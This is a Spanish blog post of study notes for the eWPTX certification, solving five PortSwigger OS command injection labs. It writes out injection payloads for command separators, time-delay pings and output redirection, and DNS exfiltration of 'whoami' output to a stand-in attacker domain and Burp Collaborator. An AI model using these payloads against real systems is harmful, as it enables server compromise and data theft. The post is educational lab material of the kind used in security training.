---
title: Inyeccion de comandos
date: '2024-05-09'
lastmod: '2023-08-05'
tags: ['Portswigger', 'Injection', 'Labs']
draft: true
summary: 'La inyecciÃ³n de comandos permite a un atacante ejecutar comandos del sistema operativo (OS) en el servidor que estÃ¡ ejecutando una aplicaciÃ³n, lo que generalmente compromete por completo la aplicaciÃ³n y sus datos.'
images: ['/static/images/htb/ewpt']
---

<p align="center">
  ![Portada](https://miro.medium.com/v2/resize:fit:640/format:webp/1*HapzmTCjNvXIff_AsOCIuw.png)
</p>

Mientras me preparo para la certificaciÃ³n eWPTX, voy a trabajar en los laboratorios de PortSwigger. En esta publicaciÃ³n, voy a "robar"... tomar notas sobre la inyecciÃ³n de comandos en el sistema operativo (OS) y resolver los laboratorios. Â¡Vamos a empezar!

<TOCInline toc={props.toc} exclude="Introduccion" />

## Â¿QuÃ© es la inyecciÃ³n de comandos OS?

La inyecciÃ³n de comandos OS permite a un atacante ejecutar comandos del sistema operativo en el servidor que ejecuta una aplicaciÃ³n, lo que generalmente compromete completamente la aplicaciÃ³n y sus datos.

### Laboratorio 1 - InyecciÃ³n de comandos OS, caso simple

> Este laboratorio contiene una vulnerabilidad de inyecciÃ³n de comandos OS en el verificador de stock de productos. La aplicaciÃ³n ejecuta un comando de shell que contiene los IDs de producto y tienda suministrados por el usuario, y devuelve la salida en bruto del comando en su respuesta. Para resolver el laboratorio, ejecuta el comando `whoami` para determinar el nombre del usuario actual.

Vamos a la pÃ¡gina y hacemos clic en el botÃ³n "View Details".
![Imagen 1](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab1/1.png)

Cuando hacemos clic en "Check Stock", se envÃ­a una solicitud con los parÃ¡metros `productId=1&storeId=2` a `/product/stock`.
![Imagen 2](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab1/2.png)
![Imagen 3](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab1/3.png)

Cambiamos `storeId=2` por ...

```bash
productId=1&storeId=| whoami
```

y nos muestra el nombre.
![Imagen 4](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab1/4.png)

## Vulnerabilidades de inyecciÃ³n de comandos OS ciegas

### DetecciÃ³n de inyecciÃ³n de comandos OS ciegas usando retrasos de tiempo

Puedes usar un comando inyectado para activar un retraso de tiempo, permitiÃ©ndote confirmar que el comando se ejecutÃ³ segÃºn el tiempo que tarda la aplicaciÃ³n en responder. El comando `ping` es una buena forma de hacer esto, ya que te permite especificar el nÃºmero de paquetes ICMP a enviar.

```
& ping -c 10 127.0.0.1 &
```

### Laboratorio 2 - InyecciÃ³n de comandos OS ciegas con retrasos de tiempo

> Este laboratorio contiene una vulnerabilidad de inyecciÃ³n de comandos OS ciegas en la funciÃ³n de retroalimentaciÃ³n. La aplicaciÃ³n ejecuta un comando de shell que contiene los detalles suministrados por el usuario. La salida del comando no se devuelve en la respuesta. Para resolver el laboratorio, explota la vulnerabilidad de inyecciÃ³n de comandos OS ciegas para causar un retraso de 10 segundos.

Vamos a la pÃ¡gina de "Submit feedback".
![Imagen 1](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab2/1.png)

En el formulario ponemos cualquier dato, lo enviamos y lo capturamos con Burpsuite.
![Imagen 2](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab2/2.png)
![Imagen 3](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab2/3.png)

DespuÃ©s de probar en todos los parÃ¡metros con la carga Ãºtil...

```
| ping -c 10 127.0.0.1 &
```

Codificado en URL...

```
|+ping+-c+10+127.0.0.1+%26
```

Â¡Vemos un retraso de 9,440 milisegundos! ğŸ¥³
![Imagen 4](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab2/4.png)

### Explotando la inyecciÃ³n de comandos OS ciegas redirigiendo la salida

Puedes redirigir la salida del comando inyectado a un archivo. El carÃ¡cter `>` envÃ­a la salida del comando `whoami` al archivo especificado. Por ejemplo:

```
& whoami > /var/www/static/whoami.txt &
```

### Laboratorio 3 - InyecciÃ³n de comandos OS ciegas con redirecciÃ³n de salida

> Este laboratorio contiene una vulnerabilidad de inyecciÃ³n de comandos OS ciegas en la funciÃ³n de retroalimentaciÃ³n. La aplicaciÃ³n ejecuta un comando de shell que contiene los detalles suministrados por el usuario. La salida del comando no se devuelve en la respuesta. Sin embargo, puedes usar la redirecciÃ³n de salida para capturar la salida del comando. Hay una carpeta escribible en: `/var/www/images/`. La aplicaciÃ³n sirve las imÃ¡genes para el catÃ¡logo de productos desde esta ubicaciÃ³n. Puedes redirigir la salida del comando inyectado a un archivo en esta carpeta y luego usar la URL de carga de imÃ¡genes para recuperar el contenido del archivo. Para resolver el laboratorio, ejecuta el comando `whoami` y recupera la salida.

Mismo procedimiento que en el laboratorio anterior: vamos a la pÃ¡gina de "Submit Feedback", llenamos el formulario, lo enviamos y capturamos la solicitud.
![Imagen 1](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab3/1.png)

Buscamos el parÃ¡metro donde inyectar el comando:

```
| whoami > /var/images/www/quiensoy.txt &
```

![Imagen 2](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab3/2.png)
![Imagen 3](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab3/3.png)

### Explotando la inyecciÃ³n de comandos OS ciegas usando tÃ©cnicas OAST

Puedes usar un comando inyectado que desencadenarÃ¡ una interacciÃ³n de red fuera de banda con un sistema que controles, utilizando tÃ©cnicas OAST.

```
& nslookup kgji2ohoyw.web-attacker.com &
```

### Laboratorio 4 - InyecciÃ³n de comandos OS ciegas con interacciÃ³n fuera de banda

> Este laboratorio contiene una vulnerabilidad de inyecciÃ³n de comandos OS ciegas en la funciÃ³n de retroalimentaciÃ³n. La aplicaciÃ³n ejecuta un comando de shell que contiene los detalles suministrados por el usuario. El comando se ejecuta de manera asÃ­ncrona y no tiene efecto en la respuesta de la aplicaciÃ³n. No es posible redirigir la salida a una ubicaciÃ³n a la que puedas acceder. Sin embargo, puedes desencadenar interacciones fuera de banda con un dominio externo. Para resolver el laboratorio, explota la vulnerabilidad de inyecciÃ³n de comandos OS ciegas para realizar una consulta DNS a Burp Collaborator.

Mismo procedimiento ğŸ˜®â€ğŸ’¨... Copia la URL de Burp Collaborator (Â¡CÃ³mpralo! ğŸ˜‰)

```
| nslookup 2be44phd8284tgglwr1sf7ytekkb81wq.oastify.com &
```

Â¡Y voilÃ !
![Imagen 1](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab4/1.png)
![Imagen 2](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab4/2.png)

### Siguiente paso

El canal fuera de banda proporciona una forma sencilla de exfiltrar la salida de los comandos inyectados.

```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

Esto provoca una consulta DNS al dominio del atacante que contiene el resultado del comando `whoami`:

```
wwwuser.kgji2ohoyw.web-attacker.com
```

### Laboratorio 5 - InyecciÃ³n de comandos OS ciegas con exfiltraciÃ³n de datos fuera de banda

> Este laboratorio contiene una vulnerabilidad de inyecciÃ³n de comandos OS ciegas en la funciÃ³n de retroalimentaciÃ³n. La aplicaciÃ³n ejecuta un comando de shell que contiene los detalles suministrados por el usuario. El comando se ejecuta de manera asÃ­ncrona y no tiene efecto en la respuesta de la aplicaciÃ³n. No es posible redirigir la salida a una ubicaciÃ³n a la que puedas acceder. Sin embargo, puedes desencadenar interacciones fuera de banda con un dominio externo. Para resolver el laboratorio, ejecuta el comando `whoami` y exfiltra la salida a travÃ©s de una consulta DNS a Burp Collaborator. DeberÃ¡s ingresar el nombre del usuario actual para completar el laboratorio.

ğŸƒâ€â™€ï¸ Ve a la pÃ¡gina de "Submit Feedback", ğŸƒâ€â™€ï¸ llena el formulario, ğŸƒâ€â™€ï¸ envÃ­alo, ğŸƒâ€â™€ï¸ captura la solicitud, copia el enlace de Burp Collaborator (Â¡CÃ“MPRALO! ğŸ˜‰â¬‡ï¸)

```
| nslookup 'whoami'.blablablablabla.whatever.com &
```

![Imagen 1](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab5/1.png)
![Imagen 2](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab5/2.png)
![Imagen 3](https://raw.githubusercontent.com/NicolasGula/NicolasGula/master/public/images/photos/lab5/3.png)

## Formas de inyectar comandos OS

Los siguientes separadores de comandos funcionan tanto en sistemas Windows como Unix:

```
&
&&
|
||
```

Unix

```
;
0x0a
\n
```

## Recursos

[Portswigger](https://portswigger.net/web-security/os-command-injection)

[HackTheBox](https://academy.hackthebox.com/module/details/109)

[INE](https://ine.com/blog/command-injection)
